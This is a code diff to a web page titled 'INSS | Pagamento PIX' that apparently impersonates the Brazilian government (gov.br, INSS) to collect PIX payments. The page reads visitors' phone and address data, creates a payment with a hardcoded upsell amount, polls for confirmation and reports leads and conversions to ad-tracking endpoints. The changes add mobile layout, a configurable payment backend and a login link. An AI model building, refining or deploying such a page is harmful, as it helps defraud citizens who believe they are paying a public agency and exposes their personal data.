@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>INSS | Pagamento PIX</title>
-    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="../logo.png" type="image/png">
     <link rel="stylesheet" href="../style.css">
     <script src="../3.4-2.16"></script>
     <link href="../css/rawline-2" rel="stylesheet">
@@ -14,7 +14,6 @@
     <script src="../jquery-3.6.0.min.js"></script>
     <!-- External CSS -->
     <script src="../npm/qrcode%401.5.0/build/qrcode.min.js"></script>
-    <link rel="stylesheet" href="../ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer">
 <link rel="stylesheet" href="../ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <script type="text/javascript">
         // Verifica o dispositivo e redireciona antes de carregar outros recursos
@@ -23,21 +22,6 @@
         }
     </script>
 
-<script>
-  window.pixelId = "68900408c79a2a1bfd8089b8";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
-  <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         tailwind.config = {
@@ -351,6 +335,71 @@
             min-height: calc(100vh - 200px);
             position: relative;
         }
+
+        .payment-header-content {
+            width: 100%;
+        }
+
+        #pixCode {
+            min-width: 0;
+        }
+
+        @media (max-width: 640px) {
+            header {
+                padding: 10px 12px;
+                overflow: visible;
+            }
+
+            header img {
+                width: 120px;
+                max-width: 40vw;
+            }
+
+            .payment-header-content {
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+
+            .payment-header-actions {
+                width: 100%;
+                justify-content: space-between;
+                gap: 4px;
+            }
+
+            .payment-header-actions .mx-3 {
+                margin-left: 4px;
+                margin-right: 4px;
+            }
+
+            .payment-header-actions #user-link {
+                padding: 8px 12px;
+            }
+
+            .govbr-container {
+                padding-left: 12px;
+                padding-right: 12px;
+            }
+
+            .notification-popup {
+                max-width: calc(100vw - 24px);
+            }
+
+            .notification-popup.show {
+                right: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .pix-copy-row {
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .pix-copy-row .copiarValor {
+                width: 100%;
+                margin-left: 0;
+            }
+        }
     </style>
    
 </head>
@@ -370,13 +419,13 @@
 
     <!-- Header do gov.br -->
     <header>
-<div class="flex justify-between items-center px-4 py-3">
+<div class="payment-header-content flex justify-between items-center px-4 py-3">
             <div class="flex items-center">
-                <a href="/" class="gov-logo">
+                <a href="../" class="gov-logo">
                     <img src="../logo.png" alt="gov.br" class="h-7">
                 </a>
             </div>
-            <div class="flex items-center">
+            <div class="payment-header-actions flex items-center">
                 <button class="header-btn" id="menu-btn" aria-label="Menu">
                     <i class="fas fa-ellipsis-v text-blue-900 mx-3"></i>
                 </button>
@@ -388,7 +437,7 @@
                 <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
                     <i class="fas fa-th text-blue-900 mx-3"></i>
                 </button>
-                <a href="" id="user-link" class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
+                <a href="../login/" id="user-link" class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
   <i class="fas fa-user mr-2"></i>
   Entrar
 </a>
@@ -436,6 +485,16 @@
 $(document).ready(function () {
     let transactionId = null;
     let paymentCheckInterval = null;
+    const paymentApiBase = typeof window.PAYMENT_API_BASE === 'string'
+        ? window.PAYMENT_API_BASE.replace(/\/+$/, '')
+        : '';
+
+    if (!paymentApiBase) {
+        $("#area-pagamento-pix").html(
+            "<p>A integração de pagamento não está configurada neste build estático.</p>"
+        );
+        return;
+    }
 
     // ⭐ INÍCIO: FUNÇÕES AUXILIARES PARA CAPTURA DE UTMs
     function getCookie(name) {
@@ -458,7 +517,14 @@ $(document).ready(function () {
     const telefoneClean = telefoneRaw.replace(/\D/g, '');
 
     const enderecoString = localStorage.getItem('endereco');
-    const endereco = enderecoString ? JSON.parse(enderecoString) : {};
+    let endereco = {};
+    if (enderecoString) {
+        try {
+            endereco = JSON.parse(enderecoString);
+        } catch (error) {
+            console.warn('Endereço salvo inválido; usando os valores padrão.', error);
+        }
+    }
     const cepClean = (endereco.cep || "88000000").replace(/\D/g, '');
 
     const valorUpsell = 10000;
@@ -487,7 +553,7 @@ $(document).ready(function () {
 
     // --- 2. CHAMADA AJAX PARA CRIAR O PAGAMENTO PIX ---
     $.ajax({
-        url: "/pagamento/pagamento-pix/getPayment.php",
+        url: `${paymentApiBase}/getPayment.php`,
         method: "POST",
         contentType: "application/json",
         data: JSON.stringify(pagueXPayload),
@@ -517,7 +583,7 @@ $(document).ready(function () {
                 
                 console.log('✅ Enviando payload de LEAD para utmify-pendente.php:', payloadPendente);
                 $.ajax({
-                    url: "/pagamento/pagamento-pix/utmify-pendente.php",
+                    url: `${paymentApiBase}/utmify-pendente.php`,
                     method: "POST",
                     contentType: "application/json",
                     data: JSON.stringify(payloadPendente),
@@ -543,7 +609,7 @@ $(document).ready(function () {
             if (!transactionId) return;
 
             $.ajax({
-                url: `/pagamento/pagamento-pix/verifyPayment.php?id=${transactionId}`,
+                url: `${paymentApiBase}/verifyPayment.php?id=${transactionId}`,
                 method: "GET",
                 success: function (response) {
                     const status = response.status ? response.status.toLowerCase() : '';
@@ -565,7 +631,7 @@ $(document).ready(function () {
 
                         console.log('✅ Enviando payload de CONVERSÃO para utmify.php:', payloadConfirmado);
                         $.ajax({
-                            url: "/pagamento/pagamento-pix/utmify.php",
+                            url: `${paymentApiBase}/utmify.php`,
                             method: "POST",
                             contentType: "application/json",
                             data: JSON.stringify(payloadConfirmado),
@@ -577,7 +643,7 @@ $(document).ready(function () {
                                 $("#area-pagamento-pix").hide();
                                 $("#mensagem-sucesso").show();
                                 setTimeout(function() {
-                                    window.location.href = "/agendamento/pagamento-confirmado";
+                                    window.location.href = "../pagamento-confirmado/";
                                 }, 3000);
                             }
                         });
@@ -629,7 +695,7 @@ $(document).ready(function () {
                             <label class="block text-sm font-medium text-gray-700 mb-2">
                                 Código PIX (Copiar e Colar)
                             </label>
-                            <div class="flex">
+                            <div class="pix-copy-row flex">
                                 <input type="text" id="pixCode" class="govbr-input flex-1" readonly="">
                                 <button class="govbr-button ml-2 copiarValor">
                                     Copiar
